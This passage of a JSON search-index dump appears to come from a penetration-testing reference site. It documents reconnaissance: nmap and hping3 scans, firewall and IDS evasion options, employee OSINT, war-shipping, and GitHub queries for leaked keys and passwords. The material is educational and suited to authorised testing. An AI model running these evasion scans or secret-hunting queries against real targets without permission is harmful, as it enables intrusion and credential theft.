that it will be vulnerable to all vulnerabilities discovered during that timeframe. Examples  Traceroute in nmap with Geo resolving: nmap --traceroute --script traceroute-geolocation.nse -p 80 [ip_or_hostname] The default packet which hping3 will create is a TCP packet: # hping3 -T -V --tr-stop -S -p 80 [ip_or_hostname] Specify the source and destination ports of the packet to help it bypass the firewall. Send three packets out ( -c ) to destination port 53 ( -p ) and set the SYN flag in the packet, so it looks like the first phase of the three-way handshake ( -S ): hping3 -c 3 -p 53 -S [ip_or_hostname] Traceroute in hping3 using a TCP scan to a specific destination port: # hping3 --traceroute --verbose --syn --destport [80] [ip_or_hostname] Discover the IP addresses of servers behind a DNS: # hping3 [big site hostname] -S -p 80 -T –ttl 13 –tr-keep-ttl -n Uptime of a server: # hping3 [ip_or_hostname] -p 80 –tcp-timestamp -S -c 4",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "77bef2e609a2bbb9d38d4b3ba1cf60fb",
    "u": "https://recon.tymyrddin.dev/docs/app/sneaky",
    "t": "Other sneaky OSINT techniques ",
    "c": "Other sneaky OSINT techniques  Engineering job listings often reveal the technologies the company uses. If you can’t find relevant job posts, search for employees’ profiles on LinkedIn, and read employees’ personal blogs or their engineering questions on forums like Stack Overflow and Quora. People’s work calendars often contain meeting notes, slides, and sometimes even login credentials. If an employee shares their calendars with the public by accident, you could gain access to these. The organisation or its employees’ social media pages might also leak valuable information. Like a sets of valid credentials on Post-it Notes visible in the background of office selfies??? If the company has an engineering mailing list, sign up for it to gain insight into the company’s technology and development process. Check for SlideShare or Pastebin accounts. Consult archive websites like the Wayback Machine . Tomnomnom’s tool Waybackurls can automatically extract endpoints and URLs from the Wayback Machine.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "563d3df639de5cc87ce98241d343a8a5",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Gathering information about a target system that can be used to execute a successful attack. To get this information, use various methods with variant tools. Why?  Analyse the security posture of the target and find loopholes for creating an attack plan. Using different tools and techniques, narrow down the range of IP addresses. Use the collected information to identify weaknesses in the target’s security. Graphically represent the target’s network, so it can be used as a guide during the attack. How?  Gather network information Gather system information Collect organisation information",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "07424d82724b1a48d202f4f49f538fd1",
    "u": "https://recon.tymyrddin.dev/docs/api/functionality",
    "t": "Understand application functionality ",
    "c": "Understand application functionality  Enumerate the endpoints and identify the parameters that can be used to call the API. Use a tool like Postman to send requests to the API and see the response. Review the API documentation. This will help understand the functionality of the API and identify the attack surface. Resources  Using SOAP requests",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "17d2dcae1d0a060e2a5976096aaad82d",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/organisation",
    "t": "Collect organisation information ",
    "c": "Collect organisation information  Employee information Organisation’s background Phone numbers Locations Advanced searches  Search engines can be used to gather information about the target organisation. Search results can include , and other information that could be useful. Search engines crawl the world wide web day and night to index new web pages and files. Sometimes this can lead to indexing confidential information: Information about employees Intranet information Login pages Documents for internal company use Confidential spreadsheets with usernames, email addresses, and even passwords Files containing usernames Sensitive directories Service version number (some of which might be vulnerable and unpatched) Error messages Google dorking  Google dorking is a technique which involves using a set of search operators and building complex queries. The operators that are used in Google hacking are called dorks. Email footprinting  Email footprinting involves collecting information from emails by monitoring the email delivery and inspecting the headers: IP address of the recipient Geolocation of the recipient Delivery information Visited links Browser and OS information Reading time Email headers contain information about the sender, subject, and recipient. All this information is valuable to hackers when planning to attack their target. Information contained in email headers include: Sender’s name IP/Email address of the sender Mail server Mail server authentication system Send and delivery stamp Unique number of the message Email tracking tools have the capability of tracking emails and inspecting their headers to extract useful information. The sender is notified of the email being delivered and opened by the recipient. Assets discovery  Assets discovery involves collecting all the company names owned by a main company and then all the assets of these companies: Find the acquisitions of the main company, this will give the companies inside the scope. Find the ASN (if any) of each company, this will give the IP ranges owned by each company. Use reverse whois lookups to search for other entries (organisation names, domains…) related to the first one (recursively). Shodan and SSL filters can be used to search for other assets (the SSL trick can be done recursively). Investigating social media  The private world of yesterday is now an online world. Everyone with a search engine has open access to social networks, government databases, and public records. Social media websites have become very popular for not only personal use but also for corporate use. Some social media platforms can reveal tons of information about the target. This is especially true as many users tend to overshare details about themselves and their work. To name but a few, it’s worthwhile checking the following: LinkedIn Twitter Facebook Instagram Google groups Social media scraping can automate discovering names, email addresses, phone numbers, biographies. Visit job listing sites  Job advertisements can also tell a lot about an organisation. In addition to revealing names and email addresses, job posts for technical positions could give insight into the target’s systems and infrastructure. The popular job posts might vary from one country to another. Make sure to check job listing sites in the countries where the target would post their ads. And it is always worth checking their website for any job opening and seeing if this can leak any interesting information.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "106e87e4f24df095e7d4f2ad32baaf0a",
    "u": "https://recon.tymyrddin.dev/docs/scanning/defence",
    "t": "Defence detection ",
    "c": "Defence detection  Check to see if a target is using a load balancing solution with the lbd (load balancing detector) command. To determine if the target is behind a web application firewall (WAF), use the wafw00f command. It may be needed to encode some attack tools to try to trick antivirus software into not seeing the code as being harmful. To detect what ports a firewall is forwarding on to a target, use the firewalk command. Is also available for nmap as firewalk.nse script.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "aba9d1f5df203926b310557f55850f83",
    "u": "https://recon.tymyrddin.dev/docs/scanning/war-dialing-driving-flying-shipping",
    "t": "War-dialing-driving-flying-shipping ",
    "c": "War-dialing-driving-flying-shipping  Discover wireless networks. War dialing  Large organisations usually have their phone numbers assigned in blocks from a local telephone company, and many have their own dialing prefix. This information was used in war dialing all the company phone numbers looking for a dial-up server. Once such a server was found, it was used for guessing account usernames. War driving  War-driving, sitting in a parking lot or in a building across the street with a laptop and a wireless NIC, looking for unsecured or poorly secured access points. War-driving has been made easy by programs such as Network Stumbler and Wellenreiter, which use consumer WiFi cards to automatically scan the airwaves for networks. These wardriving programs and databases are often correlated with global positioning system (GPS) data so that physical maps of these networks can be made. War strolling  War-strolling, simply walking around with wireless equipment looking for networks. War flying  War-flying, mounting antennas on a drone and flying it around as a variation on war-driving. War shipping  War-shipping, shipping someone a device that does wireless scans. It uses disposable, low-cost and low-power 3G-enabled single-board computers that are easy to build for under 100 euro, the proliferation of e-commerce deliveries and a command-and-control (C&C) server to remotely perform close-proximity attacks, regardless of the location of an adversary. It increases target accuracy dramatically. Hide a tiny device in a package and ship it off to the target to gain access to their network. Low build-cost means several can be shipped. The device can be tucked into the bottom of a packaging box or stuffed in a toy. While in transit, the device can do periodic basic wireless scans, similar to what a laptop does in war-driving when looking for Wi-Fi hotspots, and send its location coordinates via GPS back to the C&C server. Once having arrived it can be used for further attacks to gain a persistent foothold in the network. These attacks have their limitations. These include the amount of time it takes to perform the attack and the suspicions that arise when a car is detected circling a block hundreds of times with an auspicious antenna up top and a laptop in view, a drone circling around, and someone that seemingly aimlessly keeps wandering about. Resources  Stumbler is a tool for Windows that facilitates detection of Wireless LANs using the 802.11b, 802.11a and 802.11g WLAN standards. It runs on Microsoft Windows operating systems from Windows 2000 to Windows XP. A trimmed-down version called MiniStumbler is available for the handheld Windows CE operating system. The program is commonly used for wardriving, verifying network configurations, finding locations with poor coverage in a WLAN, detecting causes of wireless interference, detecting unauthorized (“rogue”) access points and aiming directional antennas for long-haul WLAN links. Wellenreiter is a wireless network discovery and auditing tool that supports Prism2, Lucent, and Cisco based cards. It is an easy to use Linux scanning tool. No card configuration has to be done and it is quite self-explanatory. It can discover networks (BSS/IBSS), and detects ESSID broadcasting or non-broadcasting networks and their WEP capabilities and the manufacturer automatically. DHCP and ARP traffic are decoded and displayed to give further information about the networks. An ethereal/tcpdump-compatible dumpfile and an Application savefile will be automatically created. Using a supported GPS device and the gpsd the location of the discovered networks can be tracked.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c207b124e1029a5ec3c5e3be2aa1f2e0",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/system",
    "t": "Gather system information ",
    "c": "Gather system information  Web server operating systems Server locations Users Passwords Website footprinting  Website footprinting is a technique in which information about the target is collected by monitoring the target’s website. Hackers can map the entire website of the target without being noticed. Website footprinting gives information about: Software Operating system Subdirectories  information Scripting platform Query details By examining the website headers, it is possible to obtain information about the following headers: Content-Type Accept-Ranges Connection Status Last-Modified Information X-powered-by Information Web Server Information Additional ways to gather information is through HTML Source Code and cookie examination. By examining the HTML source code, it is possible to extract information from the comments in the code, as well as gain insight into the file system structure by observing the links and image tags. Cookies can also reveal important information about the software that is running on the server and its behaviour. And by inspecting sessions, it is possible to identify the scripting platforms. Web spiders methodically browse a website in search of specific information. Information collected can be helpful in planning social engineering attacks. Cloning websites  Website mirroring or website cloning refers to the process of duplicating a website. Mirroring a website helps in browsing the site offline, searching the website for vulnerabilities, and discovering useful information. Websites may store documents of different format, which in turn may contain hidden information and metadata that can be analyzed and used in (planning) an attack. This metadata can be extracted with metadata extraction tools. Eyeing repositories  Look for hardcoded secrets: SQL passwords AWS access keys Google Cloud private keys API tokens Test accounts In GitHub search: # Sample of GitHub queries org:TargetName password org:TargetName aws_secret_access_key org:TargetName aws_key org:TargetName BEGIN RSA PRIVATE KEY org:TargetName BEGIN OPENSSH PRIVATE KEY org:TargetName secret_key org:TargetName hooks.slack.com/services org:TargetName sshpass -p org:TargetName sq0csp org:TargetName apps.googleusercontent.com org:TargetName extension:pem key Sensitive files discovery  Many tools for finding the URLs of sensitive files exist. One such tool is dirb , a web content discovery tool.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cee55ab4f5890c064bbed72e7189817c",
    "u": "https://enum.tymyrddin.dev/",
    "t": "Lay of the land ",
    "c": "Lay of the land  Move further and deeper into the scanning process to include security scanning. Enumeration is particularly useful in networks that contain unprotected network resources and services. The distinction between reconnaissance and remote enumeration is an arbitrary grey area, and during enumeration new hosts and/or services may show up, so what you can not find here you may find there . Preparation Build a local testlab Enumeration overview Systems Introduction NetBios enumeration SNMP enumeration LDAP enumeration NTP enumeration SMTP enumeration DNS enumeration macOS enumeration Linux enumeration Windows enumeration Scanning virtualised systems Scanning cloud infrastructure Web applications Introduction Dynamic web application scanning Enumerate databases Download or obtain and decompile binaries Automated vulnerability scanning Scanning an API Vulnerability identification Introduction Mapping vulnerabilities to exploits Prioritisation of vulnerabilities Discovering more vulnerabilities/exploits",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "098c1e5cdd78323ada26496c43d9d2ee",
    "u": "https://enum.tymyrddin.dev/docs/system/dns",
    "t": "DNS enumeration ",
    "c": "DNS enumeration  DNS enumeration is possible by sending zone transfer requests to the DNS primary server pretending to be a client. DNS enumerating reveals sensitive domain records in response to the request. Tools  DNS enumeration tools Remediation  Configure DNS servers not to send DNS zone transfers to unauthenticated hosts. Make sure DNS zone transfers do not contain HINFO information. Trim DNS zone files to prevent revealing unnecessary information.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d1fb7158db4895c0da090e1a0a4c25fd",
    "u": "https://recon.tymyrddin.dev/",
    "t": "Falconry ",
    "c": "Falconry  Getting to know the target using methods like researching publicly available information and network scanning. Preparation Build a local testlab Footprinting Introduction Gather network information Gather system information Collect organisation information Initial scanning Introduction War-dialing-driving-flying-shipping Live host discovery Host discovery with ICMP Host discovery with TCP Host discovery with UDP Port scanning Service and OS detection Diving deeper in discovery Defence detection Stealth scans Firewall evasion Canopy of apple-blossom Introduction Manually walk through the target Scope discovery Other sneaky OSINT techniques Tech stack fingerprinting API Mayhem Introduction Collect data Understand application functionality Analyse traffic Document key parameters Check for exposed secrets Head in the clouds Introduction Mapping endpoints Investigating AWS S3 URLs Pocketful of acorns Introduction Passive reconnaissance Recon of facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "54d37ed8ae0101af9f5cf86095e2c0d5",
    "u": "https://recon.tymyrddin.dev/docs/scanning/service-and-os",
    "t": "Service and OS detection ",
    "c": "Service and OS detection  Detect Operating Systems Detect services Service and OS detection use different methods to determine the operating system or service running on a particular port. Detect services: # nmap -sV -T4 -Pn -oG ServiceDetect -iL $TARGETFILE OS detection: # nmap -O -T4 -Pn -oG OSDetect -iL $TARGETFILE",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "516b73f997f19907408cf9a557036fbf",
    "u": "https://recon.tymyrddin.dev/docs/api/parameters",
    "t": "Document key parameters ",
    "c": "Document key parameters  An API’s attack surface includes the inputs and outputs of the API. Using the inputs and outputs, determine the potential vulnerabilities in the API. These inputs and outputs include: API calls URL parameters Headers Cookies Web responses File uploads API keys Identify the inputs and outputs of the API: The inputs and outputs of an API can be identified by the endpoints that the API provides. Make requests to different endpoints, interacting with the resources that the API exposes. The responses that the API sends back will contain the information necessary to understand the structure of the data being returned. Resources  API Security Top 10 2019",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "17825e36126dfc3ace6f87d8ffb5728c",
    "u": "https://recon.tymyrddin.dev/docs/scanning/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use … Why?  To find potential initial vulnerable attack vectors. How?  War-dialing-driving-flying-shipping Live host discovery Host discovery with ICMP (ping sweep) Host discovery with TCP Host discovery with UDP Port scanning Service and OS detection Diving deeper in discovery Defence detection Stealth scans Firewall evasion",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "738465a0e68d71e161decdd51698ce1f",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/network",
    "t": "Gather network information ",
    "c": "Gather network information  Domains Subdomains IP addresses Whois and DNS records Whois and IP Geolocation  Whois databases contain domain owners’ personal information and are maintained by the Regional Internet Registries. Thick whois contains all information from all registrars for the specified set of data. Thin whois contains limited information about the specified set of data. Whois query results typically include: Domain details Domain owner details Domain server Net range Domain expiration Creation and last update dates Regional Internet Registries, which maintain the whois databases, include: Reseaux IP Europeens Network Coordination Centre (RIPE) American Registry for Internet Numbers (ARIN) Asia-Pacific Network Information Centre (APNIC) Latin America and Caribbean Network Information Centre (LACNIC) Africa’s NIC (AFRINIC) IP Geolocation  IP geolocation helps find location information about a target such as country, city, postal code, ISP, and so on. This informationis useful for (planning) social engineering attacks on the target. DNS footprinting  DNS footprinting involves collecting information about DNS zone data, which includes information about server types and locations of key hosts in the network. Network Footprinting  Network footprinting refers to the process of collecting information about the target’s network. During this process, attackers collect network range information and use the information to map the target’s network. Network range gives attackers an insight into how the network is structured and which machines belong to the network. Nmap can be used for network discovery. It uses raw IP packets to determine the available hosts on the network, the services offered by those hosts, operating systems they are running, firewall types that are being used, and other important characteristics. Traceroute programs uses the ICMP protocol and the TTL field in the IP header to discover a route to the target host. It records IP addresses and DNS names of discovered routers underway. This information can be used for man-in-the-middle and other related attacks. The results of a traceroute can also be used to collect information about network topology, trusted routers, and firewall locations, useful for creating network diagrams and planning attacks.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b9473199958a0f7470288675561f1f33",
    "u": "https://recon.tymyrddin.dev/docs/cloud/map",
    "t": "Mapping endpoints ",
    "c": "Mapping endpoints  Collect information to identify assets a target has across all cloud providers. Identify services hosted with third-party companies. Map out all the endpoints: user interface, APIs, subnetworks, etc. for which testing is to be done. Decide which endpoints to exclude based on policy restrictions, user permissions, etc. Decide the route for performing the pentest: from application or database. Figure out how well the application server and VMs can take the load of the tests. Find out the laws that need to be followed while performing tests. Figure out which tools to use and what types of tests to do on which endpoints (Automated or Manual). Get approval for the plan from the client and inform them when you wish to begin.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1ff9b63c2a2b9b13ace655d24f5a3566",
    "u": "https://recon.tymyrddin.dev/docs/scanning/firewall",
    "t": "Firewall evasion ",
    "c": "Firewall evasion  Fragment packets: # nmap -f <IP> Most firewalls and IDS detect fragmented packets. The nmap --mtu command allows for specifying offset size (has to be a multiple of 8). This is similar to the packet fragmentation technique. During the scan, nmap creates packets of that size, causing confusion to the firewall. # nmap --mtu [MTU] <IP> Decoy: # nmap -D RND:[number] <IP> Idle zombie scan: # nmap -sI [zombie] <IP> Manually specify a source port: # nmap --source-port [port] <IP> Append random data: # nmap --data-length [size] <IP> Randomize target scan order: # nmap --randomize-hosts <IP> Spoof MAC address: # nmap --spoof-mac [MAC|0|vendor] <IP> Send bad checksums: # nmap --badsum <IP> The badsum command deploys an invalid TCP/UDP/SCTP checksum for packets transmitted to the target. Practically every host IP stack will correctly drop the packets, so each response accepted is possibly originating from a firewall or Intrusion Detection System that was not concerned with confirming the checksum.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "60ee3fc55140efa070290625facf78dd",
    "u": "https://recon.tymyrddin.dev/docs/scanning/tcp",
    "t": "Host discovery with TCP ",
    "c": "Host discovery with TCP  Split port scans by port number Low TCP port scans Medium TCP port scans High TCP port scans Split scans  Split the scans to get a set of results back in a shorter period of time. This makes it possible to start testing while the remaining results come back. By the time medium port scans are finished, underlying services of the lower ports have probably been enumerated. Use ports 0-1024 for the low range (System Ports). These scans cover services such as SMTP, Windows File Sharing, HTTP, HTTPS and other commonly found services. For medium port use ports 1025-32767 (the bulk of the User Ports). These cover NFS, Sun RPC Port Mapper, X-Windows, VNC, Microsoft Terminal Services, etc. The high port scans are for ports in the range 32768-65535 (the lesser used User Ports and Dynamic or Ephemeral ports). Hints  Do not ping the target in these scans because there may be filtering in place, which could result in pings failing and nmap accidentally concluding that a host is down. Under the hood  TCP SYN (Stealth) scan ( -sS ) is the default and most popular scan option for good reason. It can be performed quickly, scanning thousands of ports per second on a fast network not hampered by intrusive firewalls. SYN scan is relatively unobtrusive and stealthy, since it never completes TCP connections. It works against any compliant TCP stack, and allows clear, reliable differentiation between open, closed, and filtered states. Nmap starts by sending a TCP packet with the SYN flag set and the target send back a response with the SYN and ACK flags. NMap does not complete the handshake with the expected ACK and the OS suddenly receives a SYN/ACK while it hasn’t requested (NMap did). The OS responds to the unexpected SYN/ACK with an RST packet. All RST packets in such scenarios also have the ACK bit set because they are always sent in response to (and acknowledge) a received packet. Because the three-way handshake is never completed, SYN scan is sometimes called half-open scanning. If a service is listening on a port and someone makes a connection to it (by sending a SYN packet), the service will send a SYN/ACK packet in return. That means that there is a machine at that IP address. Note that some operating systems will respond with a SYN/ACK to SYN s sent to ports used for outbound TCP connections, while others will not. If no service is listening on that port but the machine is up and running and on the network, a reset ( RST ) packet will be sent back. That means there is nothing listening on that port, but having sent something in return means that a machine is at that IP address. If nothing is received after sending a SYN packet, it means there is no host at that IP address OR a firewall is blocking traffic OR the host is down. Port 80 is therefore extremely useful for ping sweeps, because most firewalls and port filters do not block web traffic. Send Receive Send Assumption SYN SYN/ACK ACK followed by RST Port is open, host is up SYN RST - Port is closed, host is up SYN Nothing - Port is blocked by firewall, host is down, or there is no host at that IP address. Interpreting portscan outputs  Some puzzling with indicators will help: Anything from 40000 onwards could be anything and only be temporary NFS can run on any port, but the Linux NFS Kernel server implementation always runs on port 2049 by default. VNC clients typically are on port 5900+ If port 5900 AND 5901 are open, most likely 5901 is a second VNC service. If port 5901 is open and 5900 closed, who knows? TCP port 8080 open can indicate a proxy server, or something like Apache Tomcat, or … A Windows Active Directory controller will have TCP ports 53 (DNS), 88 (Kerberos), 389 (LDAP), 636 (LDAP/S) and the common NetBIOS and Windows File Sharing ports 135 (used for RPC comms for AD replication), 139 (Authentication) and 445 (used for a whole host of services including file sharing and authentication) Windows systems tend to use TCP port 3389 for Microsoft Remote Desktop Protocol access. Unix-like systems often use text-based protocols on TCP ports 22 (SSH), 23 (Telnet) and 514 (RSH), or network-based Windowing protocols on TCP ports such as 590x (VNC) or 600x (X11). Examples  Low TCP port scans: # nmap -sS -PN -p 0-1024 -n -iL $TARGETFILE -oA nmap/tcp-lo The result is an open port list, with port and protocol, the port’s state and the by IANA allocated service for that port. This does not mean that a port actually runs that service. Medium TCP port scans: # nmap -sS -PN -p 1025-32767 -n -iL $TARGETFILE -oA nmap/tcp-med Remaining TCP port scans: # nmap -sS -PN -p 32768-65535 -n -iL $TARGETFILE -oA nmap/tcp-hi Expect to find Sun RPC services or DCE RPC services, 3rd-party backup utilities, and application services with SAP deployments.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "9eeb2329002066a0902a656ee46d6c70",
    "u": "https://recon.tymyrddin.dev/docs/physical/facilities",
    "t": "Recon of facilities ",
    "c": "Recon of facilities  Organisations can use a number of physical security controls to regulate who gains access to the facility or what areas in the facility they gain access to. See if you can bypass the security to gain access to areas of facilities you should not have access to. Resources  Guidelines for Performing Physical Security Tests on Facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "439632600c2c42ec4725efa6ef2a8c2e",
    "u": "https://recon.tymyrddin.dev/docs/cloud/s3-urls",
    "t": "Investigating AWS S3 URLs ",
    "c": "Investigating AWS S3 URLs  Endpoints  S3 endpoint is a region-specific URL that is used in both S3 URL styles. Most of the endpoints follow this pattern (with region names being eu-west-1 , us-west-2 , etc): s3-REGION.amazonaws.com And there are some oddities useful to know. Two endpoints that do not follow the above pattern are those of the us-east-1 region. For that region endpoints are synonyms and both point to the same place: s3.amazonaws.com s3-external-1.amazonaws.com Further, the eu-central-1 (Frankfurt) and ap-northeast-2 (Seoul) regions both have one endpoint that follows the general pattern and one alias endpoint that differs from the general scheme in one symbol (the first dash is replaced by dot): s3-eu-central-1.amazonaws.com s3.eu-central-1.amazonaws.com s3-ap-northeast-2.amazonaws.com s3.ap-northeast-2.amazonaws.com S3 bucket URL schemes  According to the S3 Developer Guide (PDF, p.57), S3 supports both virtual-hosted and path URL styles for bucket access. Path style URL  In path style URL, the bucket name is appended to the domain name and is a part of the URL path: http://s3endpoint/<bucket-name> Virtual-hosted style URL  In virtual-hosted style URL the bucket name becomes a subdomain: http://BUCKET.s3endpoint Static Website Hosting Endpoints  Using S3’s Static Website Hosting feature requires using Website Endpoints. There are two general forms of S3 website endpoint: http://BUCKET.s3-website-region.amazonaws.com http://BUCKET.s3-website.region.amazonaws.com Most of the regions follow the first form, while eu-central-1 and ap-northeast-2 follow the second. Presigned URL  Users can create a presigned URL for an object, for which security credentials, a bucket name, an object key, an HTTP method (GET to download the object), and an expiration date and time are given. The presigned URLs are valid only for the specified duration. If a presigned URL is made using a temporary token, then the URL expires when the token expires, even if the URL was created with a later expiration time. Anyone who receives the presigned URL can then access the object. Because presigned URLs grant access to the Amazon S3 buckets to whoever has the URL, Amazon recommends they be protected appropriately . Something often forgotten, apparently. Getting it, but not quite.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "117bf72c53eedd74731f47621540303a",
    "u": "https://recon.tymyrddin.dev/docs/cloud/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Cloud recon. Focus on S3 first. The growing number of Amazon Web Services S3 “data leaks” are due to human intervention – specifically, users who have not correctly configured S3 bucket policies, and as a result, allow public access to S3. In general, a lack of understanding when implementing S3, or carelessness when evaluating what should or should not be available for public consumption. Why?  To gain information for initial access in the cloud. How?  Mapping endpoints and plan Investigating AWS S3 URLs",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "99f2c2f99f7d5f85c1898215c9e40a69",
    "u": "https://recon.tymyrddin.dev/docs/api/secrets",
    "t": "Check for exposed secrets ",
    "c": "Check for exposed secrets  The authentication mechanism is used to identify the user and ensure that they are authorized to access the API. The authentication mechanism is usually a username and password, but it can also be a token or a certificate. It also gives clues to potential vulnerabilities in the API. If the authentication mechanism is weak, then the API is more vulnerable to attack. Resources  API Security Top 10",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "dd3825e3f3fb61448b666dffc1f7a801",
    "u": "https://recon.tymyrddin.dev/docs/app/techstack",
    "t": "Tech stack fingerprinting ",
    "c": "Tech stack fingerprinting  Fingerprinting techniques can help you understand the target application even better. Fingerprinting is identifying the software brands and versions that a machine or an application uses. This information allows you to perform targeted attacks on the application, because you can search for any known misconfigurations and publicly disclosed vulnerabilities related to a particular version. Run Nmap on a machine with the -sV flag on to enable version detection on the port scan. In Burp, send an HTTP request to the server to check the HTTP headers used to gain insight into the tech stack. Many web frameworks or other technologies will embed a signature in source code. Right-click a page, select View Source Code , and press CTRL-F to search for phrases like powered by , built with , and running . Check technology-specific file extensions, filenames, folders, and directories. Wappalyzer is a browser extension that identifies content management systems, frameworks, and programming languages used on a site. BuiltWith is a website that shows you which web technologies a site is built with. StackShare is an online platform that allows developers to share the tech they use. Maybe the organisation’s developers have posted their tech stack. And Retire.js is a tool that detects outdated JavaScript libraries and Node.js packages.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8a266ac0d06711e4fbb3260fc2906110",
    "u": "https://recon.tymyrddin.dev/docs/scanning/stealth",
    "t": "Stealth scans ",
    "c": "Stealth scans  Stealth  Never use connect scan ( -sT ), which establishes a full connection to a port, if one wishes to remain stealthy. Excessive port connections can create a DoS condition on older boxes, and will raise the alarms on any IDS. Use a stealthy port-scanning method with nmap, such as a TCP SYN scan (sometimes called a half-open scan). It is not only stealthy, it is also lighter on both systems, source and target. Mask your IP from the target (Don’t expect to find possibilities for either of these two all the time, but do keep looking, especially among older systems not offering useful services.): Use an FTP bounce scan if possible. Some ftp servers allow anonymous users to proxy connections to other systems. If you find an anonymous ftp server during enumeration, or you know of one to which you have login credentials, try using the -b option with user:pass@server:ftpport . If the server does not require authentication, you can skip the user:pass and if it is running on the standard port you can also leave out the ftpport part. This only works on some ftp servers. Many ftp servers today have this option disabled (by default). Idle scan gives a similar result but uses a different type of scanning. If you can identify an intermediate machine (a zombie) with low traffic and predictable fragment identification values (IP ID) you can send spoofed packets to your target, with the source set to the zombie with -sI zombiehost:port . An IDS will see the idle scan target as the system doing the scanning. If the idle target is a by your target trusted machine that can bypass host-based access control lists, jackpot!",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6342ea6759dd923f27e88734c46e6acf",
    "u": "https://recon.tymyrddin.dev/docs/app/stroll",
    "t": "Manually walk through the target ",
    "c": "Manually walk through the target  Manually walk through the application to learn more about it. Try to uncover every feature in the application that users can access by browsing through every page and clicking every link. Access the functionalities that you don’t usually use. Get a rough idea of what the attack surface (all the different points at which an attacker can attempt to exploit the application) looks like, where the data entry points are, and how different users interact with each other. Then you can start a more in-depth recon process: finding out the technology and structure of an application.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e6271cfa9c8df69dc86ca8854add5e18",
    "u": "https://recon.tymyrddin.dev/docs/scanning/icmp",
    "t": "Host discovery with ICMP ",
    "c": "Host discovery with ICMP  The easiest and fastest way to discover if a host is up or not is by trying to send some ICMP packets. Send an echo request using a simple ping or fping (for ranges). If pinging a single host works, try a ping-sweep: Send out ICMP echo requests to every system on a particular network or subset of a network to determine which hosts are up. ICMP error messages can be used to mask the source of a Distributed Denial of Service attack, and with such attacks being common, ICMP error rate limiting is often applied. To avoid filters to common ICMP echo request-response, use nmap to send other types of ICMP packets. If scans still take incredibly long, try discovering hosts with a SYN scan or UDP scan instead. Examples  Send a single echo request # ping -c 1 192.168.122.10 Send echo requests to ranges: # fping -g 192.168.122.0/24 Using nmap, send echo, timestamp requests and subnet mask requests: # nmap -PEPM -sP -n 192.168.122.0/24",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "669a9cd0954ec976c9347b7e46848a15",
    "u": "https://recon.tymyrddin.dev/docs/scanning/hosts",
    "t": "Live host discovery ",
    "c": "Live host discovery  Types of scans  ARP, ICMP, TCP, and UDP can detect live hosts. Any response from a host is an indication that it is online. Scan Type Example Command ARP Scan sudo nmap -PR -sn /24 ICMP Echo Scan sudo nmap -PE -sn /24 ICMP Timestamp Scan sudo nmap -PP -sn /24 ICMP Address Mask Scan sudo nmap -PM -sn /24 TCP SYN Ping Scan sudo nmap -PS22,80,443 -sn /30 TCP ACK Ping Scan sudo nmap -PA22,80,443 -sn /30 UDP Ping Scan sudo nmap -PU53,161,162 -sn /30 Options  Option Purpose -n no DNS lookup -R reverse-DNS lookup for all hosts -sn host discovery only",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c795c53795ef1db0037e6f7bdcee1f11",
    "u": "https://recon.tymyrddin.dev/docs/api/collect-data",
    "t": "Collect data ",
    "c": "Collect data  Collect data from applications through automated and manual means. Scan for open ports and services using shodan Use an application as intended Inspect web application with DevTools Search for API-related directories Discover API endpoints From here: an entry point (typically using the root URI of “/”) contains links to other REST APIs. Those APIs will contain links to other APIs and so on. Ideally, there is no API that does not have a link to it. Tools  Kiterunner Nikto OWASP ZAP",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "0aa1ce3d047d15d68e4a4414feb546fc",
    "u": "https://recon.tymyrddin.dev/docs/scanning/udp",
    "t": "Host discovery with UDP ",
    "c": "Host discovery with UDP  Split port scans by port number Low UDP port scans Remaining UDP port scans Relationship with ICMP  UDP is a stateless protocol. It was designed for applications that do not care whether a packet is received. This could saturate a link, and ICMP is used in its congestion control. Because UDP is stateless, it is easy to spoof using ICMP error messages to mask the source of a Distributed Denial of Service attack, and with such attacks common, UDP scans are considered bad and ICMP error rate limiting good. With 65,535 ports to scan and error rate limits of 1 ICMP message per second, it can take 9+ hours to scan some hosts. Solutions are scanning multiple hosts in parallel, scanning popular ports first, and ignoring ports that require specific protocols and scanning those separately. Older versions of Windows (and some configurations of current Windows systems) do not implement ICMP error rate limiting. Knowing beforehand which are Windows systems, these can be put on a separate IP list. Not responding  UDP services are highly unlikely to respond to a regular empty UDP probe datagaram because the underlying application does not receive a packet that causes it to respond. The solution is to send a packet related to the most likely service (based on port number) running under it. For example, brute forcing SNMP on port 161 could be worthwhile and sending a correctly formed DNS query datagram to UDP port 